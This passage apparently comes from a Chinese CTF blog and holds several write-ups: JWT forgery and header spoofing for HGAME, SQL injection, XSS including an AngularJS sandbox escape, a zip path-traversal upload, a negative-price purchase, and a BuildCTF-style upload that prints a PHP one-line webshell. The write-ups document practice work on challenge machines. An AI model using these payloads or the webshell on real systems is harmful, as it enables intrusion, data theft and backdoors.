进行操作。 使用 ewogICJhbGciOiAiTm9uZSIKfQ.eyJJRCI6MCwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjk2NDI5MTM3OTIsImlzcyI6Ik1KY2xvdWRzIn0. 发现服务器不支持 None 算法： 12345&#123; &quot;code&quot;: 14005, &quot;message&quot;: &quot;signing method (alg) is unavailable.&quot;, &quot;count&quot;: 0&#125; 而 Signature 那么长也爆破不了 secret。注意到有个 ID 字段，怀疑是根据 ID 查询密码作为密钥的，尝试注入。 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6W10sIlVzZXJOYW1lIjoiYWRtaW4iLCJQaG9uZSI6IiIsIkVtYWlsIjoiIiwiZXhwIjo5NjQyOTEzNzkyLCJpc3MiOiJNSmNsb3VkcyJ9. 然后返回了这个： 12345&#123; &quot;code&quot;: 14005, &quot;message&quot;: &quot;json: cannot unmarshal array into Go struct field JWTClaims.ID of type uint&quot;, &quot;count&quot;: 0&#125; 好了，现在我们得知后端是 Go 了，但是事实上并没有什么用。 P.S. 作者当时还去搜索了 Go 的 JWTClaims，发现确实有 CVE，但是这题里面毫无关系，反而思路被带偏了。 机缘巧合的是在我把 secret 置空以后发现生成的和最开始的那个居然一模一样，真是吐血，居然 secret 是空。这我一开始是真没想到。 然后我把 ID 改为 0，UserName 改为 admin， eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MCwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDI5OTMwNTcsImlzcyI6Ik1KY2xvdWRzIn0.DFdaY3gfvJ-9g7bz9wDSWCIGqlROXKo-_O4l4gTvToQ 服务器返回： 12345&#123; &quot;code&quot;: 14005, &quot;message&quot;: &quot;大坏蛋别做坏事！！！&quot;, &quot;count&quot;: 0&#125; 当时吓我一大跳，还以为又白做了。但我把我自己 token 的 ID 改了发现也是这个结果，才知道这个返回的意思是 ID 和 Username 不匹配。 于是把 ID 改成 1， eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDI5OTMwNTcsImlzcyI6Ik1KY2xvdWRzIn0.HKmz9ithj9bnb6c2pKDGiHUSPxSR6b9x5gho5vTmyKc 服务器返回： 123456789101112131415161718&#123; &quot;code&quot;: 2000, &quot;message&quot;: &quot;success&quot;, &quot;count&quot;: 1, &quot;data&quot;: [ &#123; &quot;ID&quot;: 1, &quot;CreatedAt&quot;: &quot;2022-01-18T21:58:53.457+08:00&quot;, &quot;UpdatedAt&quot;: &quot;2022-01-20T22:29:31.955+08:00&quot;, &quot;DeletedAt&quot;: null, &quot;todo_name&quot;: &quot;hgame&#123;S0_y0u_K1n0w_hOw_~JwT_Works~1l1lL&#125;&quot;, &quot;description&quot;: &quot;some desc&quot;, &quot;end_time&quot;: &quot;2022-01-18T21:58:53+08:00&quot;, &quot;status&quot;: 0, &quot;user_id&quot;: 1 &#125; ]&#125; 拿到 flag：hgame&#123;S0_y0u_K1n0w_hOw_~JwT_Works~1l1lL&#125; 蛛蛛…嘿嘿♥我的蛛蛛 进去就让你点按钮，点了几次试了一下，后来受不了直接写了一个功能弱一点的脚本（按照题目来说就是让你写爬虫的）： 1234list = document.querySelectorAll(&#x27;a&#x27;);list.forEach(x =&gt; &#123; if (x.href != location.href) x.click();&#125;); 在控制台不停执行就行，最后到了 https://hgame-spider.vidar.club/636defa854?key=MmhhqguSUpelDSTyNsBjinkUo458MpiGW72R6HiydqseM8lZ3zEn%2BQT0a7vs09NjqB9KtkAYWtKYf4HVifIN1A%3D%3D。 网页中间一个大大的标题 我好像在就是把flag落在这里了欸~ 快帮我找找x，联系到 URL 的 key，一开始怀疑这个 key 是加密的。 先 URL 解码得到 MmhhqguSUpelDSTyNsBjinkUo458MpiGW72R6HiydqseM8lZ3zEn+QT0a7vs09NjqB9KtkAYWtKYf4HVifIN1A==，一开始看着结尾的 == 以为是 Base64，然而失败了。 后来意识到可能不在这，在响应头里发现了 fi4g: hgame&#123;202418360e93093582ff7358f3b3829d3f733935bef5686eeb568e9848b779c1&#125; 拿到 flag：hgame&#123;202418360e93093582ff7358f3b3829d3f733935bef5686eeb568e9848b779c1&#125; Tetris plus 打开网页，是个小游戏，题目描述说“据说没人能超过 3000 分”，着重寻找代码里和这个有关的。 首先我们要知道，作者一般不会自己去写这个小游戏的，所以小游戏的代码可以先不看。 然后我们找到了 js/checking.js，有这么一段代码： 12345if (score &gt;= 3000 &amp;&amp; !window.winned) &#123; winned = true alert(atob(&quot;ZmxhZyDosozkvLzooqvol4/otbfmnaXkuobvvIzlho3mib7mib7lkKch&quot;)) // [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])()&#125; 执行一下那行 alert 再说，得到的是“flag 貌似被藏起来了，再找找吧!”。 然后发现下面那一长串可疑的注释，做 Hackergame 的经验告诉我，这是可以解码的，得到 alert(&quot;hgame&#123;jsfuck_1s_S0_fUu1n&#125;&quot;)，然后 flag 就出来了。。 flag：hgame&#123;jsfuck_1s_S0_fUu1n&#125; P.S. 菜鸡作者这时候才知道 jsfuck 这玩意，以前只知道 BrainFuck。 Fujiwara Tofu Shop 每一层题目都给了提示，说实在的这和校内的比赛第一题简直一模一样。。 想成为车神，你需要先去一趟秋名山（qiumingshan.net） 这个 URL 是无法解析的，我们只需在请求头里加上 Referer: qiumingshan.net 即可。 只有借助AE86才能拿到车神通行证（Hachi-Roku） 借助一个东西？立马想到 User-Agent，在请求头里加上 User-Agent: Hachi-Roku 即可。 86的副驾上应该放一盒树莓（Raspberry）味的曲奇 曲奇？Cookie！但是发现直接 Cookie: Raspberry 不行，查看响应头发现 Set-Cookie: flavor=Strawberry，于是得到正确的格式 Cookie: flavor=Raspberry。 汽油都不加，还想去秋名山？请加满至100 同样是在响应头发现 Gasoline 字段，在请求头里加上 Gasoline: 100 即可。 哪怕成了车神，也得让请求从本地发出来才能拿到 flag ！ 最有趣的地方来了，首先要知道 localhost 是 127.0.0.1 的别名。 然后常规思路是用 X-Forwarded-For，但是当我请求带上 X-Forwarded-For: 127.0.0.1，服务器返回“大黑阔也想当车神？”。啊，这熟悉的口音，令人难绷。然后一时没有办法了 这时候想起信息搜集，仔细观察响应头，发现 Server: gin-gonic/gin v1.7.7，仿佛找到了新大陆。 然后发现了这个 https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-1041736 欸，这可不就是和 X-Forwarded-For 有关吗？ 再去 Github 上找是咋修的，然后发现了 X-Real-Ip 这个字段。请求头里加上 X-Real-Ip: 127.0.0.1 就拿到 flag 了。 拿到 flag：hgame&#123;I_b0ught_4_S3xy_sw1mSu1t&#125; 坐等晚上官方 wp。 To be continued…","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"HGAME","slug":"CTF/HGAME","permalink":"https://sxyugao.top/categories/CTF/HGAME/"}],"tags":[{"name":"HGAME","slug":"HGAME","permalink":"https://sxyugao.top/tags/HGAME/"}]},{"title":"《从0到1：CTFer成长之路》- Web","slug":"《从0到1：CTFer成长之路》-Web","date":"2022-01-08T07:10:08.000Z","updated":"2022-02-23T04:00:02.671Z","comments":true,"path":"p/ba510b53.html","permalink":"https://sxyugao.top/p/ba510b53.html","excerpt":"前言 这里是我做《从0到1：CTFer成长之路》上的题的一些记录。 本篇是 Web 篇。","text":"前言 这里是我做《从0到1：CTFer成长之路》上的题的一些记录。 本篇是 Web 篇。 Web 入门 常见的搜集 打开靶机发现啥也没有。因此需要我们进行信息搜集。 使用 dirsearch 一共扫到了这些文件和目录（注意扫描的频次，过高会导致扫不出来）： 1234/index.php/index.php~/robots.txt/.index.php.swp 先看一下 robots.txt，里面内容如下： 123User-agent: *Disallow:/flag1_is_her3_fun.txt 访问 /flag1_is_her3_fun.txt，我们就能拿到 flag 的第一部分了。 接下来访问 /index.php~，拿到 flag 的第二部分。 最后把 /.index.php.swp 下载到本地，发现里面有这么一段代码： 1&lt;?php echo &#x27;flag3:p0rtant_hack&#125;&#x27;;?&gt; 成功拿到 flag 第三部分，拼起来就是最终的 flag 了。 index.php 是常见的主页文件 index.php~ 是 gedit 编辑文件保存后的备份文件 .index.php.swp 是 vim 编辑文件后的缓存文件 robots.txt 告诉搜索引擎哪些文件希望让爬虫获取哪些不希望让它获取 粗心的小李 启动靶机以后直接就告诉你是 Git 泄露，我们直接使用工具 scrabble 把 .git 爬下来就行，发现一个 index.html，打开就能看到 flag 了。 正常来说，应该是先用 dirsearch 扫到 .git 文件夹后怀疑存在 Git 泄露再用工具下载。 SQL注入-1 启动靶机后直奔地址栏，发现注入点 /index.php?id=1 直接告诉你了，直接开整。 因为 id 是数字，且页面中有标题有正文，先构造 payload：1+ORDER+BY+2+--+，发现行不通，怀疑是字符型的了。 再试试 1'+ORDER+BY+2+--+，发现正常回显了，最后试出来共返回三个数据。 再构造 payload：'+UNION+SELECT+'aaa','bbb','ccc'+--+ 来确定是哪两个回显的，得知是后两个。 再构造 payload：'+UNION+SELECT+NULL,NULL,TABLE_NAME+FROM+information_schema.tables+WHERE+TABLE_SCHEMA=DATABASE()+--+，拿到数据库里的表名 fl4g。 再构造 payload：'+UNION+SELECT+NULL,NULL,COLUMN_NAME+FROM+information_schema.columns+WHERE%20TABLE_NAME='fl4g'+--+，拿到表里的列名 fllllag。 最后使用 payload：'+UNION+SELECT+NULL,NULL,fllllag+FROM+fl4g+--+，拿到最终的 flag。 Web进阶 XSS闯关 第一关 观察到 url 中有 ?username=xss，而网页中正好存在 welcome xss，猜测是直接替换。 payload： level1?username=&lt;script&gt;alert(1)&lt;/script&gt; 第二关 一开始以为和第一关一样，但是没有用。 查看网页源代码后发现 document.getElementById('ccc').innerHTML= &quot;Welcome &quot; + escape(username);。 而 username 定义时如果字符串中有 / 就会报错，于是想到注入点可以在变量定义那里 var username = 'xss';，闭合语句即可。 payload：level2?username=';alert(1);//，变量定义的语句变为 var username = '';alert(1);//';。 第三关 这次先用第二关的 payload，然后直奔网页源代码，发现字符都被转义了。 var username = '\\';alert(1);//' 但是莫名其妙的事情发生了，我直接 ?username='';alert(1);// 居然直接过了，看了源代码居然只转义了一个，var username = '\\'';alert(1);//'，就很迷，可能是后端写锅了？ 神奇的 payload：level3?username='';alert(1);//，官方正解是写入标签 level3?username=&lt;img src=233 onerror=alert(1)&gt; 第四关 发现是自动跳转的网页，源代码里发现注入点是 jumpUrl，使用 JavaScript 伪协议来实现。 payload：level4?jumpUrl=javascript:alert(1) 第五关 直接提交发现不太行，观察源代码。 发现有 autosubmit action 两个参数，其中需要我们把 autosubmit 置 1，然后会跳转到 action 参数的链接。 比方说，有 level5?autosubmit=1&amp;action=233，网站会跳转到 /233 上去。 于是再用 JavaScript 伪协议，得到 payload：level5?autosubmit=1&amp;action=javascript:alert(1) 第六关 先随便试了一下，发现对输入进行了转义。 查看源代码后发现使用了 angular.js 模板引擎，就去稍微了解了一下。 angular.js 模板引擎分为 JiT 和 AoT 两种编译方式，Jit 保留了 Angular 的 &#123;&#123;&#125;&#125;，在浏览器中由 JS 来动态解释，AoT 则是现在本地编译好，再上传到实际环境中。 实际测试发现是 JiT 形式的，且可更改的地方被 ng-app 所包裹。 试着写入模板 level6?username=&#123;&#123;2*2&#125;&#125;，回显是 welcome 4，源代码是 welcome &#123;&#123;2*2&#125;&#125;，验证了之前的想法。 现在要想办法让 angular.js 解析的时候执行指定的命令如 alert，该怎么办呢？ 上网查阅了资料，首先发现 angular.js 有对字符串解析为语句的函数 $eval，但 angular.js 有类似沙箱的机制，会对 $eval 的参数进行解析。 作为一个纯萌新，就开始观摩大佬的文章。 然而东西有点多啊，得开新文章来专门讲一下了。。。 真的佩服这种代码审计的大佬，几万行的代码还要找出逻辑上的漏洞。 先放结论，更为细致的研究请等新文章吧。 payload：level6?username=&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125; 这种题目是怎么敢只放在进阶的啊，只论 exp 不论原理了吗 文件上传 题目告诉了我们源码，我们先分析代码逻辑。 有一个 check_dir($dir) 函数，对 $dir 文件夹进行递归删除非 .jpg .gif .png 的文件。 每次上传文件会随机生成一个临时文件夹用于存放上传的文件，仅允许上传 .zip .jpg .gif .png 文件，如果是压缩包，则会对压缩包进行解压，并对解压后的文件夹进行 check_dir。关键的一点，本题不含文件包含，因此上传的文件必须能被服务器解析才行。 本题提示每5分钟会清除一次目录下上传的文件，做题的时候没注意时间，意外发现 404 报错时给了服务器提示 Apache/2.4.7 (Ubuntu) Server，而 Apache 存在多后缀文件解析漏洞。 检查十分严格，只能从压缩包解压入手，做 MISC 题的时候常有压缩包带密码的情景，这时候会把里面未加密的文件解压出来，但最后解压还是失败的，但出题人连这个都过滤了，就算异常解压也会检查目录下的文件。这个代码逻辑完全正确，一时没有办法。 后来得知 PclZip 有目录穿越漏洞，解题的法则便确定了。 我们新建一个 000000shell.php.PHP，文件名中的 0 是占位符，文件内容随意，打包成一个 zip 文件。然后用 010 Editor 将压缩包里的 frFileName 和 deFileName 改成 ../../shell.php.PHP，因为解压的目录是临时目录，所以返回两层才是网站根目录，而且并不会被定时删除。 然后访问 /shell.php.PHP 就能拿到 flag。 P.S. 这题环境挺奇怪的，一般都是一句话木马之类的，但这题只要正常解析就行，还必须是 .php，而且蚁剑还不能连，不知道能不能拿到服务器配置看一下。 逻辑漏洞 进去发现是个登录界面，随便输啥都能登录成功，发现是个买东西的界面，显而易见我们需要购买 flag 这个商品。 但是 flag 需要 2000 块钱，我们买不了，但是我们可以买别的东西，发现购买成功，且传递的参数有 cost 和 goods，而 cost 的值正好是标价。 一个正常的商店肯定是不需要传递 cost 值的，说明我们可以在这个参数上做文章。 我们先 /buy.php?cost=0&amp;goods=1，发现钱不够，猜测判断能否购买是根据数据库来的。那么这个 cost 有什么用呢？看来是余额去减的值了。 我们只需要找到能买的商品，然后将 cost 设为负数即可。payload：/buy.php?cost=-100000&amp;goods=3，然后再去购买就能拿到 flag 了。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"N1BOOK","slug":"CTF/N1BOOK","permalink":"https://sxyugao.top/categories/CTF/N1BOOK/"}],"tags":[{"name":"N1BOOK","slug":"N1BOOK","permalink":"https://sxyugao.top/tags/N1BOOK/"}]},{"title":"BUUCTF [极客大挑战 2019]Upload","slug":"BUUCTF-极客大挑战-2019-Upload","date":"2021-12-30T12:38:49.000Z","updated":"2023-04-08T09:48:43.311Z","comments":true,"path":"p/3ec26275.html","permalink":"https://sxyugao.top/p/3ec26275.html","excerpt":"报名参加了 SU 战队，交接的师傅给了一道文件包含的题，从中我学到了很多。一般来说，文件包含肯定伴随着文件上传，所以就找了 BUUCTF 上的一道简单题练练手。","text":"报名参加了 SU 战队，交接的师傅给了一道文件包含的题，从中我学到了很多。一般来说，文件包含肯定伴随着文件上传，所以就找了 BUUCTF 上的一道简单题练练手。 前置准备 进入靶机，发现是要我们上传一个图片。 随便传了一个图片，发现并不知道文件传到哪里了。 于是我们用 dirsearch 爆破一下网站目录，发现存在一个 /upload 文件夹，看来就是它了。 正式开工 我们需要上传一个包含我们恶意代码的文件，并执行它。 最最简单的方式是传一个“一句话木马”，它相当于是一个后门，可以直接执行我们想执行的命令，省去反复上传文件的麻烦。 1&lt;?php @eval($_POST[&#x27;shell&#x27;]); ?&gt; 或是使用 PHP HTML: 1&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;shell&#x27;])&lt;/script&gt; 这段代码接受 POST 请求中的 shell 字段，并将其解析为 PHP 代码执行。 先尝试直接提交文件，发现检测了后缀名。再尝试改后缀名，又发现检测了文件头。观察前端代码，发现存在 &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;，看来就是这个 upload_file.php 检测的。考虑加上 GIF89a 这类较为简单的文件头，发现上传成功了。 但是 gif 文件并不会被解析执行，所以我们需要更改文件后缀名，使用 BurpSuite 修改请求中的 filename 的后缀名，在尝试了 php phtm 之类后，终于在 phtml 这个后缀名上成功了。再使用 AntSword 这款工具，获得了服务器上的所有信息。 而 flag 就在服务器根目录下，至此，我们成功拿到了 flag。 一些后话 在拿到服务器信息后，我翻看了网页的源码，对之前做题过程有了全新的认知。 首先，它并不是检测文件后缀名，而是检测请求中的文件类型，而这一步是本地发送请求时就确定的。也就是说，我完全可以直接上传 payload.phtml，然后在 BurpSuite 中将请求包中的 Content-Type: application/octet-stream 改为 Content-Type: image/gif 也可实现文件上传。 其次，它过滤了 &lt;?。在文件上传中还有一种绕过方式是短标签绕过，显然这里把这条路堵上了。但是它把 PHP 文件类型全过滤了，不知道这个意义何在 总之，我对请求头有了全新的认知，也算是繁重期末中的一丝娱乐吧。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://sxyugao.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"BurpSuite使用指南","slug":"BurpSuite使用指南","date":"2021-11-06T02:59:13.000Z","updated":"2022-02-23T04:00:30.581Z","comments":true,"path":"p/b2d83691.html","permalink":"https://sxyugao.top/p/b2d83691.html","excerpt":"BurpSuite 是 PorSwigger 开发的 Web 神器，本文就介绍一些 BurpSuite 的使用方法。 其实算是自用笔记","text":"BurpSuite 是 PorSwigger 开发的 Web 神器，本文就介绍一些 BurpSuite 的使用方法。 其实算是自用笔记 安装 官网：https://portswigger.net/burp，找到社区版下载安装即可。 配置代理 配置监视代理 因为抓包需要经过服务器，而 BurpSuite 其实相当于将你本地设备设为一个服务器，默认端口为 8080。 以 Google Chrome 